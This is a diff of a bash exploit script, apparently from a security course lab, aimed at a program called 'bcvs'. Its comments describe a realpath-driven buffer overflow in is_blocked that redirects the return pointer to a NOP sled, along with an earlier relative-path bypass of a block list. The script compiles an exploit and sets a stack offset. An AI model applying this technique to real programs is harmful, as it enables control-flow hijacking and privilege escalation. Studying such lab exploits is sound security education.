@@ -1,27 +1,14 @@
 #!/bin/bash
 
 ## -------------------- Description -------------------- ##
-# The bcvs program uses a relative path to check its
-# "block.list". Therefore you can simply execute bcvs
-# from a directory other than its usual but with the
-# same directory layout and you can get around the blocks
-#
-# Right now this sploit is not complete but being able to
-# bypass the block check is a start.
-#
-# Right now I am working on exploiting the strcpy/strcat
-# overflow in the copyFile function.
+# Sploit7 takes advantage of a buffer overflow in the is_blocked fucntion caused by the realpath fucntion. 
+# This sploit is a buffer overflow leading to a control flow hijack. The overwritten return pointer of the
+# is_blocked function points back up the stack into the approximate region where the attack string is located
+# and hits a nop sled.
 ## ----------------------------------------------------- ##
 
 EXPLOIT_EXE="./exploit"
-#SPLOIT_DIR="sploit7_dir"
 
-
-#rm -rf $SPLIOT_DIR
-#mkdir -p $SPLOIT_DIR
-#cd $SPLOIT_DIR
-#mkdir -p .bcvs
-#touch .bcvs/block.list
 rm -rf exploit
 rm -rf exploit.c
 
@@ -98,7 +85,7 @@ EOS
 gcc -o exploit exploit.c
 
 OFFSET=1139
-#OFFSET=1000
+
 
 echo "hey" > "haxor"
 
